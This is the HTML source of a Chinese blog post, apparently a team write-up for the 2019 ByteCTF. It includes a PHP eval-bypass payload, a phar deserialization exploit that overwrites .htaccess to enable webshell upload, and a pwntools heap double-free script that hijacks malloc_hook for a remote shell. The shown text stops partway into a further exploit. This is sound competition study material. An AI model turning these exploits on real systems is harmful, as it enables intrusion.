@@ -1,0 +1,1941 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Xi4or0uji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Xi4or0uji">
+    
+    <meta name="keywords" content="蒟蒻的ctf博客,Xi4or0uji">
+    
+    <meta name="description" content="还在路上">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>2019 bytectf wp · Xi4or0uji</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/images.jpg">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Xi4or0uji&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2019 bytectf wp</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Xi4or0uji's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2019 bytectf wp
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.9k</span>阅读时长: <span class="post-count reading-time">10 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/11</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>前几天打了字节跳动的CTF，我还是太菜了，挂一挂队内wp  </p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="boring-code"><a href="#boring-code" class="headerlink" title="boring_code"></a>boring_code</h4><p>题目给了源码，但是很是做了很久才出来，wtcl<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            var_dump($code);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>一开始的baidu域名绕过绕了快一天，最后买了个域名就出了（这个题出钱就出flag.jpg<br>接下来的就是绕过payload了，这个考点跟之前ph牛的无参函数绕过很相似，但是过滤更加严格<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(chdir(next(scandir(chr(ord(strrev(crypt(serialize(<span class="keyword">array</span>())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(<span class="keyword">array</span>()))))))));</span><br></pre></td></tr></table></figure></p>
+<p><img src="/assets/2019bytectf/1.png" alt=""></p>
+<h4 id="ezCMS"><a href="#ezCMS" class="headerlink" title="ezCMS"></a>ezCMS</h4><p>首先是扫后台扫到源码，然后就是进行源码审计，可以看到前半部分是个简单的哈希长度扩展攻击，想要文件上传先要绕过这关，脚本就不贴了，网上随便都能搜到<br>接下来的就是phar和zip的利用去删除网站文件绕过上传shell，exp如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Admin();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $size;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $content_check;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_check = <span class="keyword">new</span> Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Check</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">"/var/www/html/sandbox/21817c35416d7783669a7c7d8ed6c73a/.htaccess"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = ZipArchive::OVERWRITE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> File();</span><br><span class="line">$object -&gt; s = <span class="string">'aaa;'</span>;</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure></p>
+<p>触发反序列化漏洞就用<code>php://filter</code>去绕过<br><img src="/assets/2019bytectf/2.png" alt=""></p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="mulnote"><a href="#mulnote" class="headerlink" title="mulnote"></a>mulnote</h4><p>这道题就是一道double free（友好的出题人）<br>首先先在ida里面分析出函数，可以知道malloc&lt;0x10000，也就是可以unsorted_bin和fast_bin的攻击，后面也一样，把函数分析出来，会发现free函数有UAF（动态调试比静态分析好多了，直接动态边调试边看），想到fastbin的attcak，首先unsorted_bin申请再释放泄露出真实地址，然后double free改malloc_hook为onegadget，最后getshell<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./mulnote'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./mulnote'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'112.126.101.96'</span>, <span class="number">9999</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'C'</span>)</span><br><span class="line">    ru(<span class="string">"size&gt;"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"note&gt;"</span>) </span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'S'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index1,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'E'</span>)</span><br><span class="line">    ru(<span class="string">"index&gt;"</span>)</span><br><span class="line">    sl(str(index1))</span><br><span class="line">    ru(<span class="string">"new note&gt;"</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index1)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'R'</span>)</span><br><span class="line">    ru(<span class="string">"index&gt;"</span>)</span><br><span class="line">    sl(str(index1))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;"</span>)</span><br><span class="line">    sl(<span class="string">'Q'</span>)</span><br><span class="line">malloc(<span class="number">0xC8</span>,<span class="string">'AAAAAAA'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">puts()</span><br><span class="line">ru(<span class="string">"[*]note[0]:\n"</span>)</span><br><span class="line">malloc_hook = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"malloc_hook--&gt;"</span> + hex(malloc_hook)</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">onegadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span> </span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">'A'</span>*<span class="number">0x68</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">'B'</span>*<span class="number">0x68</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,<span class="string">'V'</span>*<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">malloc(<span class="number">0x68</span>,p64(fake_chunk))</span><br><span class="line">malloc(<span class="number">0x68</span>,p64(fake_chunk))</span><br><span class="line">malloc(<span class="number">0x68</span>,p64(fake_chunk))</span><br><span class="line">py  = <span class="string">''</span></span><br><span class="line">py += <span class="string">'a'</span>*<span class="number">0x13</span> + p64(onegadget)</span><br><span class="line">malloc(<span class="number">0x68</span>,py)</span><br><span class="line">ru(<span class="string">"&gt;"</span>)</span><br><span class="line">sl(<span class="string">'C'</span>)</span><br><span class="line">ru(<span class="string">"size&gt;"</span>)</span><br><span class="line">sl(<span class="string">'200'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h4 id="vip"><a href="#vip" class="headerlink" title="vip"></a>vip</h4><p>因为become vip函数中调用了prctl函数，而在输入名字处能溢出到v4，也就是prctl的第7个参数，溢出大小为0x30，所以可以构造沙箱规则将open函数关闭（顺便打开mprotect绕过NX），这样在edit函数中open(“/dev/urandom”, 0);返回值就为0，所以read(fd,a1,a2) == read(0,a1,a2) 就是用户输入了，然后这个函数没有对size进行检测所以存在任意长度的堆溢出，接下来就tcache了,但是因为execve函数被禁用了，所以这里用写shellcode直接读flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 